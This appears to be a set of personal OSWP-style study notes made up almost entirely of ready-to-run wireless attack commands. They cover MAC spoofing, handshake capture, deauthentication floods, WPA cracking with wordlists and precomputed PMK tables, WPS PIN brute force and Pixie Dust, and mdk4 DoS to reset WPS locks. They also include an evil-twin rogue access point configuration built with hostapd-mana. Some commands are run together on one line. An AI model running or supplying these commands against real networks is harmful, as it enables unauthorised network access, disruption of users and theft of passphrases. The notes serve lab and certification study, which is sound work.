### 📘 **Wireless Toolkit Notes**

---

#### 🔹 Change the MAC Adress

```bash
systemctl stop network-manager
ip link set wlan2 down
macchanger -m <the New MAC Adress> wlan2
ip link set wlan2 up
```

-------------------------
#### 🔹 Start Monitor Mode on a Specific Channel

```bash
sudo airmon-ng start <wireless_interface> <channel_num>
```

- Only set the channel here if the next tool **cannot** set it itself (e.g., `aireplay-ng`).
    
- If you plan to run `airodump-ng` first, it will lock the channel automatically.
    

---

#### 🔹 Show Interface Information

```bash
sudo iw dev wlan0mon info
```

```bash
sudo iwconfig wlan0mon
```

- Displays current channel, frequency, mode, and other stats.

-------------

#### 🔹 List System & Wireless Card Details

```bash
sudo airmon-ng --verbose
```

- Shows chipset, driver, and whether monitor-mode interfaces are active.
    

---

#### 🔹 Stop Monitor Mode

```bash
sudo airmon-ng stop wlan0mon
```

---

## 🕵️‍♂️ **Airodump-ng**

```bash
sudo airodump-ng [options] <interface>
```

|Option|Description|
|---|---|
|`-w <prefix>`|Save capture dump using `<prefix>` as filename|
|`--bssid <BSSID>`|Capture only packets from the given AP MAC|
|`-c <channel>`|Force capture on specified channel(s)|
|`--band abg`|Show only 5 GHz APs (bands a/b/g/abg)|
|`--essid <name>`|Filter output to only show this ESSID|

---

#### 🔹 Sniff & Capture Handshake

```bash
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
```

- `-c 3` → lock to channel 3
    
- `--bssid 34:08:04:09:3D:38` → target AP
    
- `-w cap1` → write to `cap1-01.cap`, `cap1-01.csv`, etc.
    

--------------------------------------------
#### 🔹## Show the 5gh AP's

```bash
sudo airodump-ng wlan0mon --band abg
```

---

#### 📊 **Airodump-ng Output Fields**

|Field|Description|
|---|---|
|**BSSID**|MAC of the AP|
|**PWR**|Signal strength (higher = closer)|
|**RXQ**|Receive quality (%) over last 10 s|
|**Beacons**|Number of beacon frames sent by the AP|
|**#Data**|Number of data packets (for WEP, equals IV count)|
|**#/s**|Data packets per second|
|**CH**|Channel of the AP|
|**MB**|Max speed supported (11 = 802.11b; 54 = 802.11g; >54 = 802.11n/ac)|
|**ENC**|Encryption (OPN/WEP/WPA/WPA2/WPA3/OWE)|
|**CIPHER**|Cipher in use (CCMP/TKIP/WEP/etc.)|
|**AUTH**|Auth method (PSK/MGT/SKA/OPN)|
|**ESSID**|Network name (empty if hidden)|

Lower pane:

|Field|Description|
|---|---|
|**STATION**|MAC of each associated client|
|**Rate**|RX-TX rates|
|**Lost**|Frames lost over last 10 s|
|**Packets**|Packets sent by client|
|**Probes**|ESSIDs probed by client|

---

## 🔫 **Aireplay-ng**

- Generates or injects traffic to force handshakes, replay ARP, etc.
    
- Common WPA attacks:
    
    - **0** → Deauthentication
        
    - **9** → Injection test (broadcast probes)
        

|Option|Description|
|---|---|
|`-0 <count>`|Deauthenticate `<count>` times (WPA handshake capture)|
|`-9`|Injection test (check frame injection)|
|`-a <BSSID>`|Target AP MAC|
|`-c <Client>`|Target client MAC|
|`-e <ESSID>`|Filter/target specific SSID|
|`-x <pps>`|Packets per second (for replay attacks)|
|`-g <value>`|Ring buffer size|
|`-j`|ARP replay (inject FromDS packets)|
|`-B`|Bit rate test|
|…|_(see full `--help` for all flags)_|

---

#### 🔹 Basic Injection Test

1. Set monitor to target channel (e.g., channel 3):
    
    ```bash
    sudo airmon-ng start wlan0 3
    ```
    
2. Run injection test:
    
    ```bash
    sudo aireplay-ng -9 wlan0mon
    ```
    
    - Successful output:  
        `Injection is working!`
        

------------
#### 🔹 To sniff the data of a specific AP on a given channel

```bash
sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
```

`The -w options to output to a file.`

---

#### 🔹 Injection Test for Specific AP

```bash
sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
```

---

#### 🔹 Card-to-Card Injection Test

```bash
sudo aireplay-ng -9 -i wlan1mon wlan0mon
```

- Requires two monitor interfaces to fully test all injection methods.
    

---

## 🔓 **Cracking & Decryption Tools**

---

#### 🔹 Crack WPA Handshake (Aircrack-ng)

```bash
aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
```

- `-w` → wordlist
    
- `-e` → ESSID
    
- `-b` → BSSID
    

---

#### 🔹 Benchmark Aircrack-ng CPU Speed

```bash
aircrack-ng -S
```

> Example: `11117.918 k/s`

---

#### 🔹 Decrypt Captured Traffic (Airdecap-ng)

```bash
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
```

- Strips headers and decrypts payload when PSK is known.
    

---

#### 🔹 Graph Wireless Data (Airgraph-ng)

```bash
airgraph-ng <csv-file>
```

- Generates visual graphs of networks and clients using Airodump CSVs.
    

---

#### 🔹 Brute-force Hidden SSID (mdk4)

```bash
iwconfig wlan0mon channel 3
mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt
```

- Switch to AP channel, then run `mdk4` with your wordlist for SSID cracking.
    

---

These notes consolidate commands, inline explanations, and option tables for quick reference during OSWP labs or real-world assessments.

### 📘 **Wireless Password Cracking Notes (Aircrack-ng & John the Ripper)**

---

#### 🔹 Scan for Nearby Networks

`sudo airodump-ng wlan0mon`

---

#### 🔹 Focus on a Target Network (Capture Handshake)

`sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon`

---

#### 🔹 Deauthenticate a Client (Force Handshake)

`sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon`

_If no handshake is captured, increase the deauth count._

---

 And on other termenal :
#### 🔹 Crack Handshake with Wordlist

`aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap`

---

#### 🔹 Brute-force SSID (Hidden Network)

`iwconfig wlan0mon channel 11 mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f ~/wifi-rockyou.txt`

---

#### 🔹 Connect to Open WiFi via Bash

`network={     ssid="ESSID"     key_mgmt=NONE     scan_ssid=1 }`

Save to `free.conf`, then:

`wpa_supplicant -Dnl80211 -iwlan2 -c free.conf` 

In another terminal as root:

`sudo dhclient wlan2 -v`

----------------------
#### 🔹 Connect to WPA-PSK with password

```
network={
  ssid="home_network"
  scan_ssid=1
  psk="password_here"
  key_mgmt=WPA-PSK
}
```

---

#### 🔹 Decrypt Traffic with Known Password

`airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap`

---

#### 🔹 Edit John the Ripper Mangling Rules

`sudo nano /etc/john/john.conf`

Add under `[List.Rules:Wordlist]`:

`$[0-9]$[0-9] $[0-9]$[0-9]$[0-9]`

---

#### 🔹 Test Custom JtR Rules

`john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123`

---

#### 🔹 Crack WPA Handshake Using JtR Output

`john --wordlist=/usr/share/john/password.lst --rules --stdout | aircrack-ng -e wifu -w - wpa-01.cap`

✅ **KEY FOUND!** Example:

`KEY FOUND! [ Password123 ]`

### 📘 **Airolib-ng Notes for Multi-SSID WPA Cracking**

---

#### 🔹 Create PMK Database

```
airolib-ng wifi-db --init
```

---

#### 🔹 Import Multiple SSIDs

```
airolib-ng wifi-db --import essid Home_Network 
airolib-ng wifi-db --import essid Cafe_Wifi 
airolib-ng wifi-db --import essid Office_Wifi
```

---

#### 🔹 Import Wordlist

```
airolib-ng wifi-db --import passwd /usr/share/wordlists/rockyou.txt
```


---

#### 🔹 Generate PMK Entries (Pre-compute all combinations)

```
airolib-ng wifi-db --batch
```

---

#### 🔹 Use the Database with Different Handshake Captures

```
aircrack-ng -r wifi-db home.cap 
aircrack-ng -r wifi-db office.cap 
aircrack-ng -r wifi-db cafe.cap
```

----------------------------
#### 🔹 Install coWPAtty

`sudo apt install cowpatty`

#### Notes:

- **Rainbow tables** (pre-computed PMKs) significantly speed up WPA cracking.
    
- **Each ESSID** must have its own set of precomputed hashes.
    
- **coWPAtty** can use both **dictionary-based mode** and **precomputed-hash mode**.
    
- Hashes are generated using `genpmk` and reused/shared.
    
- Works offline, similar to `aircrack-ng`.

----------------------------
#### 🔹 Generate Pre-computed Hashes

`genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu`

|Option|Description|
|---|---|
|`-f`|Path to wordlist file|
|`-d`|Output hash database file|
|`-s`|ESSID (target network name)|

> This step creates a rainbow table for the `wifu` ESSID using a wordlist. Required for coWPAtty’s fast hash-based cracking.

----------------------------
#### 🔹 Crack WPA Key using Precomputed Hashes

`cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu`

|Option|Description|
|---|---|
|`-r`|Capture file containing the WPA 4-way handshake|
|`-d`|Path to precomputed hash file|
|`-s`|ESSID to match with hash file|

> This attack is extremely fast (milliseconds), assuming the correct handshake and rainbow table are available.


### 📘 **WPS Attacks**
#### 🔹 Scan WPS-Enabled Networks (wash)

`wash -i wlan0mon`

Displays WPS info like BSSID, channel, vendor, and lock status. Useful for identifying vulnerable APs.

---

#### 🔹 Brute-force WPS PIN (Reaver)

`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv`

Launches a WPS PIN brute-force attack. Reaver tries common PINs and continues until success.

---

#### 🔹 Fix “Waiting for beacon” Issue (Reaver with channel)

`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -c 3 -vv`

Manually set the channel to help Reaver detect the target AP.

---

#### 🔹 Pixie Dust Attack (Reaver + PixieWPS)

`sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv -K`

Performs offline WPS PIN attack using leaked crypto values. Very fast on vulnerable APs.

---

#### 🔹 WPS Attack with Bully (PixieWPS Mode)

`bully -d wlan0mon -b 34:08:04:09:3D:38 -v 4`

Bully brute-forces WPS PIN and attempts PixieWPS if supported.

---

#### 🔹 Test Known Default WPS PINs (Airgeddon)

`sudo apt install airgeddon source /usr/share/airgeddon/known_pins.db echo ${PINDB["0013F7"]}`

Searches Airgeddon’s database for default WPS PINs based on BSSID prefix.

---

#### 🔹 Manually Test Known PIN with Reaver

`reaver -i wlan0mon -b 34:08:04:09:3D:38 -p 14755989 -vv`

Tries a specific WPS PIN on the AP. Useful for testing known/default PINs.

---

#### 🔹 Resume Reaver After Failure

`sudo reaver -i wlan0mon -b 34:08:04:09:3D:38 -vv`

When WPS transaction fails, restart without `-K` to resume from saved session.

---

#### 🔹 Force WPS Lock Bypass (mdk4 DoS)

`mdk4 wlan0mon a -a 34:08:04:09:3D:38`

Launches authentication DoS attack to crash AP and potentially reset WPS lock.

---

#### 🔹 One-PIN Try with Bully

`bully -d wlan0mon -b 34:08:04:09:3D:38 -B -p 96039620`

Uses a single known PIN to retrieve the WPA passphrase quickly.

⚠️ **Common Issues and Solutions**

|Issue|Solution|
|---|---|
|WPS Transaction Failure|Restart `reaver` without `-K`, or try a different wireless adapter.|
|ACK Issues (Same PIN loop)|Use a different wireless adapter for better compatibility.|
|WPS Lock|Use `mdk3` or `mdk4` DoS attack to force the router to reboot.|

---

💡 **Quick Tips**

- Always try **PixieWPS** first — it's much faster.
    
- Not all routers are vulnerable to the **PixieWPS** attack.
    
- Some networks **lock WPS automatically** after several failed attempts.
    
- Some wireless adapters are **not compatible** with `reaver` or `bully`, especially regarding **ACKs** or **association** failures.

---------------------
### 📘 **Rogue Access Points**

🔹 **Start Recon with Airodump-ng**

`sudo airodump-ng -w discovery --output-format pcap wlan0mon`

Captures nearby APs and clients into a `.pcap` file for further analysis.

---

🔹 **Analyze Beacon Frames in Wireshark**

`Filter: wlan.fc.type_subtype == 0x08 && wlan.ssid == "Mostar"`

Shows beacon frames from the AP "Mostar" with full security config (WPA1/WPA2 + TKIP/CCMP).

---

🔹 **Key Info from Wireshark - Mostar AP**

```bash
ESSID: Mostar   
BSSID: FC:7A:2B:88:63:EF   
Channel: 1   
Encryption: WPA1/WPA2 (TKIP & CCMP)   
Auth: PSK   
Speed: 130 Mbps → 802.11n
```

Rogue AP must match these parameters to trick the client.

---

🔹 **Rogue AP Configuration - Mostar Clone**

```
kali@kali:~$ cat Mostar-mana.conf

interface=wlan0  
ssid=Mostar  
channel=1  
hw_mode=g              # 2.4GHz band  
ieee80211n=1           # Enable 802.11n  
wpa=3                  # Enable WPA & WPA2  
wpa_key_mgmt=WPA-PSK  
wpa_passphrase=ANYPASSWORD  # Any PSK – just for handshake capture  
wpa_pairwise=TKIP  
rsn_pairwise=TKIP CCMP  
mana_wpaout=/home/kali/mostar.hccapx  # Save handshake here
```

✅ Matches target AP  
✅ Saves captured handshakes  
✅ Fake PSK accepted – handshake still works

---

🔹 **Starting Rogue AP**

```bash
sudo hostapd-mana Mostar-mana.conf
```

📡 Hostapd-Mana broadcasts "Mostar" clone  
📥 Logs handshake captures (even with wrong PSK)

---

🔹 **Captured Handshake Example**

```
MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e  
AP-STA-POSSIBLE-PSK-MISMATCH
```

🧠 Clients try to connect if signal is stronger  
🪝 Handshake captured even though auth fails

---

🔹 **Forcing Clients to Connect**

```bash
sudo airmon-ng start wlan1 1
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
```

💣 Sends continuous deauth packets  
🔄 Clients drop target AP and try our rogue AP  
📶 Higher chance of handshake capture

---

🔹 **Cracking the Handshake**

```bash
aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
```

🎯 **KEY FOUND!** [ `teddybear` ]  
🔓 PSK recovered from captured handshake

---

🔹 **Wireshark - Mostar AP Snapshot**

```
ESSID: Mostar  
BSSID: FC:7A:2B:88:63:EF  
Channel: 1  
Encryption: WPA1/WPA2 (TKIP & CCMP)  
Auth: PSK  
Speed: 130 Mbps → 802.11n
```

🧬 Rogue AP must **mimic** these parameters

---

### 📘 **WEP Attacks**


- There are no handshakes here.

------------------------

#### 🔹 ARP Replay Attack - Generate More Traffic

```
aireplay-ng -3 -b <BSSID> -h <your MAC> wlan0mon
```

------------------------------

#### 🔹 Fake Authentication (If ARP Replay Fails)

```
aireplay-ng -1 0 -a <BSSID> -h <your MAC> wlan0mon
```


>Associates your interface with the AP before injection. Required in some cases to bypass AP restrictions.

-----------------------

